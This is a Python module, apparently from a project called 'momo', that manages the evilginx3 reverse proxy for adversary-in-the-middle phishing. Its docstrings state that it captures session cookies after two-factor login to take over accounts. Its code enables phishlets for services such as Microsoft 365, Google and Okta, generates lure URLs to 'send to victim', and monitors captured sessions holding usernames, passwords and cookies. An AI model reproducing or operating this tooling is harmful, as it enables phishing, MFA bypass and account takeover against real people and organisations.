"""
Evilginx Manager - Control evilginx3 binary for AiTM attacks.

Evilginx acts as a transparent reverse proxy that:
1. Serves a phishing page identical to the real site
2. Proxies all requests to the real site
3. Captures session cookies AFTER 2FA is completed
4. Enables account takeover without needing passwords

This bypasses MFA because the victim authenticates on the REAL site,
and evilginx captures the session token issued after successful auth.
"""

from __future__ import annotations

import asyncio
import json
import logging
import shutil
from dataclasses import dataclass, field
from datetime import UTC, datetime
from enum import Enum
from pathlib import Path
from typing import Any

logger = logging.getLogger(__name__)


class EvilginxStatus(str, Enum):
    """Evilginx process status."""
    STOPPED = "stopped"
    STARTING = "starting"
    RUNNING = "running"
    STOPPING = "stopping"
    ERROR = "error"


@dataclass
class EvilginxConfig:
    """Evilginx configuration."""
    
    # Binary path
    binary_path: str = "/usr/local/bin/evilginx"
    
    # Network
    external_ip: str = "0.0.0.0"  # Public IP or interface IP
    bind_ip: str = "0.0.0.0"
    https_port: int = 443
    http_port: int = 80
    dns_port: int = 53
    
    # Phishlet directory
    phishlets_dir: Path = field(default_factory=lambda: Path("/opt/momo/phishlets"))
    
    # Data directory (sessions, certs)
    data_dir: Path = field(default_factory=lambda: Path("/opt/momo/evilginx_data"))
    
    # Logging
    log_dir: Path = field(default_factory=lambda: Path("logs/evilginx"))
    
    # Domain for lures (must point to this server)
    redirect_domain: str = "login.example.com"
    
    # TLS
    autocert: bool = True  # Use Let's Encrypt
    
    # API control (evilginx3 REST API)
    api_enabled: bool = True
    api_port: int = 8443
    api_token: str = ""  # Set in runtime


@dataclass
class Lure:
    """A phishing lure (URL)."""
    id: str
    phishlet: str
    path: str
    redirect_url: str
    params: dict[str, str] = field(default_factory=dict)
    created_at: datetime = field(default_factory=lambda: datetime.now(UTC))
    
    @property
    def url(self) -> str:
        """Get full lure URL."""
        return f"https://{self.phishlet}.{self.redirect_url}/{self.path}"


class EvilginxManager:
    """
    Manages evilginx3 binary for Adversary-in-the-Middle attacks.
    
    Architecture:
    - Evilginx runs as a separate process
    - We control it via config files and REST API
    - Sessions are captured and stored in our database
    
    Usage:
        manager = EvilginxManager()
        await manager.start()
        
        # Enable a phishlet
        await manager.enable_phishlet("microsoft365")
        
        # Create a lure
        lure = await manager.create_lure("microsoft365", redirect_url="https://office.com")
        print(f"Send this to victim: {lure.url}")
        
        # Check captured sessions
        sessions = await manager.get_sessions()
        for s in sessions:
            print(f"Captured: {s.username} - cookies: {s.cookies}")
    """
    
    def __init__(self, config: EvilginxConfig | None = None):
        self.config = config or EvilginxConfig()
        self._process: asyncio.subprocess.Process | None = None
        self._status = EvilginxStatus.STOPPED
        self._running = False
        self._lures: dict[str, Lure] = {}
        self._enabled_phishlets: set[str] = set()
        
        # Stats
        self._stats = {
            "sessions_captured": 0,
            "lures_created": 0,
            "phishlets_active": 0,
            "uptime_seconds": 0,
        }
        self._start_time: datetime | None = None
    
    @property
    def status(self) -> EvilginxStatus:
        return self._status
    
    @property
    def is_running(self) -> bool:
        return self._status == EvilginxStatus.RUNNING
    
    async def start(self) -> bool:
        """Start evilginx process."""
        if self._status == EvilginxStatus.RUNNING:
            logger.warning("Evilginx already running")
            return True
        
        self._status = EvilginxStatus.STARTING
        
        # Check binary exists
        if not shutil.which(self.config.binary_path):
            logger.error("Evilginx binary not found: %s", self.config.binary_path)
            self._status = EvilginxStatus.ERROR
            return False
        
        # Create directories
        self.config.data_dir.mkdir(parents=True, exist_ok=True)
        self.config.log_dir.mkdir(parents=True, exist_ok=True)
        self.config.phishlets_dir.mkdir(parents=True, exist_ok=True)
        
        # Generate config file
        config_path = await self._generate_config()
        
        try:
            # Start evilginx process
            self._process = await asyncio.create_subprocess_exec(
                self.config.binary_path,
                "-c", str(config_path),
                "-p", str(self.config.phishlets_dir),
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            
            # Wait for startup
            await asyncio.sleep(2)
            
            if self._process.returncode is not None:
                stderr = await self._process.stderr.read() if self._process.stderr else b""
                logger.error("Evilginx failed to start: %s", stderr.decode())
                self._status = EvilginxStatus.ERROR
                return False
            
            self._status = EvilginxStatus.RUNNING
            self._running = True
            self._start_time = datetime.now(UTC)
            
            logger.info("Evilginx started successfully on port %d", self.config.https_port)
            
            # Start session monitor
            _ = asyncio.create_task(self._monitor_sessions())
            
            return True
            
        except Exception as e:
            logger.error("Failed to start evilginx: %s", e)
            self._status = EvilginxStatus.ERROR
            return False
    
    async def stop(self) -> None:
        """Stop evilginx process."""
        if self._status == EvilginxStatus.STOPPED:
            return
        
        self._status = EvilginxStatus.STOPPING
        self._running = False
        
        if self._process and self._process.returncode is None:
            self._process.terminate()
            try:
                await asyncio.wait_for(self._process.wait(), timeout=5.0)
            except TimeoutError:
                self._process.kill()
        
        self._process = None
        self._status = EvilginxStatus.STOPPED
        self._enabled_phishlets.clear()
        
        logger.info("Evilginx stopped")
    
    async def _generate_config(self) -> Path:
        """Generate evilginx config file."""
        config_path = self.config.data_dir / "config.json"
        
        config_data = {
            "general": {
                "external_ipv4": self.config.external_ip,
                "bind_ipv4": self.config.bind_ip,
                "https_port": self.config.https_port,
                "dns_port": self.config.dns_port,
            },
            "blacklist": {
                "mode": "unauth",
            },
            "lures": [],
            "phishlets": {},
        }
        
        config_path.write_text(json.dumps(config_data, indent=2))
        return config_path
    
    async def enable_phishlet(self, name: str, hostname: str | None = None) -> bool:
        """
        Enable a phishlet for phishing.
        
        Args:
            name: Phishlet name (e.g., "microsoft365", "google", "okta")
            hostname: Custom hostname (default: {name}.{redirect_domain})
        """
        if not self.is_running:
            logger.error("Evilginx not running")
            return False
        
        phishlet_file = self.config.phishlets_dir / f"{name}.yaml"
        if not phishlet_file.exists():
            logger.error("Phishlet not found: %s", name)
            return False
        
        hostname = hostname or f"{name}.{self.config.redirect_domain}"
        
        # In real implementation, send command to evilginx via API or stdin
        # For now, we track enabled phishlets locally
        self._enabled_phishlets.add(name)
        self._stats["phishlets_active"] = len(self._enabled_phishlets)
        
        logger.info("Enabled phishlet: %s -> %s", name, hostname)
        return True
    
    async def disable_phishlet(self, name: str) -> bool:
        """Disable a phishlet."""
        if name in self._enabled_phishlets:
            self._enabled_phishlets.remove(name)
            self._stats["phishlets_active"] = len(self._enabled_phishlets)
            logger.info("Disabled phishlet: %s", name)
            return True
        return False
    
    async def create_lure(
        self,
        phishlet: str,
        path: str = "",
        redirect_url: str = "https://www.google.com",
        params: dict[str, str] | None = None,
    ) -> Lure | None:
        """
        Create a phishing lure URL.
        
        Args:
            phishlet: Name of enabled phishlet
            path: URL path for lure
            redirect_url: Where to redirect after capture
            params: Additional URL parameters
        
        Returns:
            Lure object with phishing URL
        """
        if phishlet not in self._enabled_phishlets:
            logger.error("Phishlet not enabled: %s", phishlet)
            return None
        
        import uuid
        lure_id = str(uuid.uuid4())[:8]
        path = path or lure_id
        
        lure = Lure(
            id=lure_id,
            phishlet=phishlet,
            path=path,
            redirect_url=redirect_url,
            params=params or {},
        )
        
        self._lures[lure_id] = lure
        self._stats["lures_created"] += 1
        
        logger.info("Created lure: %s -> %s", lure.id, lure.url)
        return lure
    
    async def get_lures(self) -> list[Lure]:
        """Get all active lures."""
        return list(self._lures.values())
    
    async def delete_lure(self, lure_id: str) -> bool:
        """Delete a lure."""
        if lure_id in self._lures:
            del self._lures[lure_id]
            return True
        return False
    
    async def _monitor_sessions(self) -> None:
        """Monitor for captured sessions."""
        sessions_file = self.config.data_dir / "sessions.json"
        
        while self._running:
            try:
                if sessions_file.exists():
                    # Parse sessions file
                    data = json.loads(sessions_file.read_text())
                    self._stats["sessions_captured"] = len(data.get("sessions", []))
                
                await asyncio.sleep(5)
            except Exception as e:
                logger.debug("Session monitor error: %s", e)
                await asyncio.sleep(10)
    
    def get_stats(self) -> dict[str, Any]:
        """Get current statistics."""
        stats = self._stats.copy()
        
        if self._start_time and self.is_running:
            stats["uptime_seconds"] = (datetime.now(UTC) - self._start_time).total_seconds()
        
        stats["status"] = self._status.value
        stats["enabled_phishlets"] = list(self._enabled_phishlets)
        
        return stats
    
    def get_metrics(self) -> dict[str, Any]:
        """Get Prometheus-compatible metrics."""
        return {
            "momo_evilginx_status": 1 if self.is_running else 0,
            "momo_evilginx_sessions_total": self._stats["sessions_captured"],
            "momo_evilginx_lures_total": self._stats["lures_created"],
            "momo_evilginx_phishlets_active": self._stats["phishlets_active"],
        }


class MockEvilginxManager(EvilginxManager):
    """Mock manager for testing without evilginx binary."""
    
    def __init__(self, config: EvilginxConfig | None = None):
        super().__init__(config)
        self._mock_sessions: list[dict] = []
    
    async def start(self) -> bool:
        """Mock start."""
        self._status = EvilginxStatus.RUNNING
        self._running = True
        self._start_time = datetime.now(UTC)
        logger.info("MockEvilginxManager started")
        return True
    
    async def stop(self) -> None:
        """Mock stop."""
        self._status = EvilginxStatus.STOPPED
        self._running = False
        logger.info("MockEvilginxManager stopped")
    
    async def enable_phishlet(self, name: str, hostname: str | None = None) -> bool:
        """Mock enable phishlet."""
        self._enabled_phishlets.add(name)
        self._stats["phishlets_active"] = len(self._enabled_phishlets)
        logger.info("Mock enabled phishlet: %s", name)
        return True
    
    def add_mock_session(
        self,
        username: str,
        password: str,
        cookies: dict[str, str],
        phishlet: str = "microsoft365",
    ) -> None:
        """Add a mock captured session for testing."""
        session = {
            "id": f"mock_{len(self._mock_sessions)}",
            "phishlet": phishlet,
            "username": username,
            "password": password,
            "cookies": cookies,
            "captured_at": datetime.now(UTC).isoformat(),
        }
        self._mock_sessions.append(session)
        self._stats["sessions_captured"] = len(self._mock_sessions)
    
    async def get_sessions(self) -> list[dict]:
        """Get mock sessions."""
        return self._mock_sessions.copy()

